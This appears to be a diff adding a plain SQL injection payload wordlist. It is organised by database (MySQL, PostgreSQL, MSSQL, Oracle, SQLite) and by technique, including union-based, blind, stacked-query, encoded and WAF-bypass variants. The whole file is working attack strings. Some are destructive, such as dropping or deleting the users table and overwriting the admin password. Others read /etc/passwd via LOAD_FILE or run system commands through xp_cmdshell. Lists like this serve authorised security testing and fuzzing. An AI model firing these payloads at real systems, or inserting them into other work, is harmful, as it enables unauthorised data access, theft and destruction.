@@ -1,0 +1,139 @@
+# SQL Injection Payloads
+# Organized by database type and technique
+
+# === Generic Error-based ===
+'
+''
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1/*
+') OR ('1'='1
+')) OR (('1'='1
+' OR 1=1 LIMIT 1 --
+' OR 1=1 LIMIT 1 OFFSET 0 --
+
+# === Union-based ===
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT NULL,NULL,NULL,NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT 1,2,3,4 --
+' UNION ALL SELECT NULL,NULL --
+' UNION SELECT @@version --
+' UNION SELECT database() --
+' UNION SELECT user() --
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns --
+
+# === MySQL Specific ===
+' AND 1=1 --
+' AND 1=2 --
+' OR sleep(5) --
+' AND sleep(5) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) #
+' WAITFOR DELAY '0:0:5' --
+' AND BENCHMARK(1000000,MD5('A')) --
+' UNION SELECT LOAD_FILE('/etc/passwd') --
+' UNION SELECT INTO OUTFILE '/tmp/test' --
+
+# === PostgreSQL Specific ===
+' AND 1=1 --
+' AND 1=2 --
+' OR pg_sleep(5) --
+' AND pg_sleep(5) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+' UNION SELECT version() --
+' UNION SELECT current_database() --
+' UNION SELECT current_user --
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns --
+
+# === MSSQL Specific ===
+' AND 1=1 --
+' AND 1=2 --
+' WAITFOR DELAY '0:0:5' --
+' WAITFOR TIME '00:00:05' --
+' ; WAITFOR DELAY '0:0:5' --
+' UNION SELECT @@version --
+' UNION SELECT DB_NAME() --
+' UNION SELECT SYSTEM_USER --
+' UNION SELECT name FROM master..sysdatabases --
+' UNION SELECT name FROM master..sysobjects WHERE xtype='U' --
+' EXEC xp_cmdshell 'whoami' --
+' ; EXEC xp_cmdshell 'whoami' --
+
+# === Oracle Specific ===
+' AND 1=1 --
+' AND 1=2 --
+' OR 1=1 --
+' UNION SELECT NULL FROM DUAL --
+' UNION SELECT 1,2,3 FROM DUAL --
+' UNION SELECT banner FROM v$version --
+' UNION SELECT table_name FROM all_tables --
+' UNION SELECT column_name FROM all_tab_columns --
+' UNION SELECT user FROM DUAL --
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5) --
+' AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) > 0 --
+
+# === SQLite Specific ===
+' AND 1=1 --
+' AND 1=2 --
+' UNION SELECT sqlite_version() --
+' UNION SELECT name FROM sqlite_master WHERE type='table' --
+' UNION SELECT sql FROM sqlite_master WHERE type='table' --
+
+# === Time-based Blind ===
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) #
+' OR SLEEP(5) --
+' OR SLEEP(5) #
+' AND SLEEP(5) --
+' AND SLEEP(5) #
+' ; SELECT SLEEP(5) --
+' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))A) --
+
+# === Boolean-based Blind ===
+' AND 1=1 --
+' AND 1=2 --
+' AND '1'='1
+' AND '1'='2
+' AND 1=1 AND 1=1 --
+' AND 1=1 AND 1=2 --
+
+# === Stacked Queries ===
+'; DROP TABLE users --
+'; DELETE FROM users --
+'; INSERT INTO users VALUES ('admin','password') --
+'; UPDATE users SET password='password' WHERE username='admin' --
+
+# === Comment Variations ===
+' OR '1'='1' -- -
+' OR '1'='1' #
+' OR '1'='1'/*
+' OR '1'='1'--+
+' OR '1'='1'-- -
+
+# === Encoding Variations ===
+%27%20OR%20%271%27%3D%271
+%27%20OR%20%271%27%3D%271%27%20--%20
+%27%20OR%201%3D1%20--%20
+%2527%2520OR%2520%25271%2527%253D%25271
+
+# === WAF Bypass Techniques ===
+'/**/OR/**/'1'='1
+'/*!50000OR*/'1'='1
+' OR '1'='1' --+
+' OR '1'='1' -- -
+' OR 1=1--+
+' OR 1=1-- -
+' OR 1=1--+
+' OR 1=1-- -
+' OR 1=1;%00
+' OR 1=1--%0A
+' OR 1=1--%0D
